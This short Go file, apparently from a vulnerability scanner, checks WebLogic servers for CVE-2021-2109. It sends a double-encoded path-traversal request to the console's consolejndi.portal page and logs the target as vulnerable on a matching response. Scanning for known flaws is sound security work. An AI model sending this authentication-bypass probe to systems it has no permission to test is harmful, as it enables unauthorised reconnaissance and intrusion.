package weblogic

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
	"strings"
)

func CVE_2021_2109(url string) bool {
	if req, err := pkg.HttpRequset(url+"/console/css/%252e%252e%252f/consolejndi.portal", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "Weblogic") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2021_2109|%s\n", url))
			return true
		}
	}
	return false
}
